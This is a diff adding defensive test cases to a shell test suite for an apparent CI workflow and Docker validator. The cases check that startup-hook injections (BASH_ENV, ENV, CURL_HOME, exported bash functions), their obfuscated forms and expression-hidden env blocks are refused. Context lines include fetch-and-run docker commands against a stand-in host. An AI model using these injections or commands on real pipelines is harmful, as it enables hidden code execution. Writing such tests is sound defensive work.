@@ -1623,6 +1623,109 @@ case_ n18-config-other         bad "$(rb 'export DOCKER_CONFIG=/tmp/attacker; do
 case_ n18-config-fresh-ok      ok  "$(rb 'DOCKER_CONFIG=$(mktemp -d); export DOCKER_CONFIG; docker ps')"
 case_ n19-buildx-remote        bad "$(r 'docker buildx create --driver remote tcp://x:1234 --use')"
 case_ n20-import-url           bad "$(r 'docker import https://x.example/rootfs.tar img:1')"
+# --- startup-hook env names (BASH_ENV, ENV, CURL_HOME, BASH_FUNC_<name>%%) refused at every env: level
+case_ hook-step-bash-env       bad "$head
+    steps:
+      - run: echo hi
+        env:
+          BASH_ENV: /tmp/x"
+case_ hook-step-env            bad "$head
+    steps:
+      - run: echo hi
+        env:
+          ENV: /tmp/x"
+case_ hook-step-curl-home      bad "$head
+    steps:
+      - run: echo hi
+        env:
+          CURL_HOME: /tmp/x"
+case_ hook-step-bash-func      bad "$head
+    steps:
+      - run: echo hi
+        env:
+          BASH_FUNC_x%%: '() { :; }'"
+case_ hook-workflow-bash-env   bad "on: push
+env:
+  BASH_ENV: /tmp/x
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo hi"
+case_ hook-job-bash-env        bad "$head
+    env:
+      BASH_ENV: /tmp/x
+    steps:
+      - run: echo hi"
+case_ hook-quoted-bash-env     bad "$head
+    steps:
+      - run: echo hi
+        env:
+          \"BASH_ENV\": /tmp/x"
+case_ hook-escaped-bash-env    bad "$head
+    steps:
+      - run: echo hi
+        env:
+          \"BASH_\x45NV\": /tmp/x"
+case_ hook-flow-bash-env       bad "$head
+    steps:
+      - run: echo hi
+        env: { BASH_ENV: /tmp/x }"
+case_ hook-merge-bash-env      bad "$head
+    steps:
+      - run: echo hi
+        env:
+          <<: { BASH_ENV: /tmp/x }"
+case_ hook-harmless-env-ok     ok  "$head
+    steps:
+      - run: echo hi
+        env:
+          LANG: C"
+case_ hook-run-mention-ok      ok  "$head
+    steps:
+      - run: echo BASH_ENV is not set here"
+# --- an env: that is not a literal mapping hides the startup-hook names from the key check
+case_ hookexpr-workflow        bad "on: push
+env: \${{ fromJSON(vars.X) }}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo hi"
+case_ hookexpr-job             bad "$head
+    env: \${{ fromJSON(vars.X) }}
+    steps:
+      - run: echo hi"
+case_ hookexpr-step            bad "$head
+    steps:
+      - run: echo hi
+        env: \${{ fromJSON(vars.X) }}"
+case_ hookexpr-composite-step  bad "$head
+    steps:
+      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - run: echo hi\n      shell: bash\n      env: \${{ fromJSON(vars.X) }}\n' > tools/a/action.yml"
+case_ hookexpr-container       bad "$head
+    container:
+      image: alpine@$DIG
+      env: \${{ fromJSON(vars.X) }}
+    steps:
+      - run: true"
+case_ hookexpr-services        bad "$head
+    services:
+      db:
+        image: postgres@$DIG
+        env: \${{ fromJSON(vars.X) }}
+    steps:
+      - run: true"
+case_ hookexpr-container-literal-ok ok "$head
+    container:
+      image: alpine@$DIG
+      env:
+        LANG: C
+    steps:
+      - run: true"
+case_ hookexpr-composite-literal-ok ok "$head
+    steps:
+      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - run: echo hi\n      shell: bash\n      env:\n        LANG: C\n' > tools/a/action.yml"
 # --- Sonnet #164 r14 (NEW-21, NEW-22): a loaded tarball or an archive copy is never "the job's own bytes"
 case_ n21-load-tag-run         bad "$(rb 'curl -sL https://x.example/i.tar -o i.tar; docker load -i i.tar; docker tag sha256:deadbeef myname:latest; docker run myname:latest')"
 case_ n21-tag-unpinned-src     bad "$(rb 'docker tag alpine:latest mine; docker run mine')"
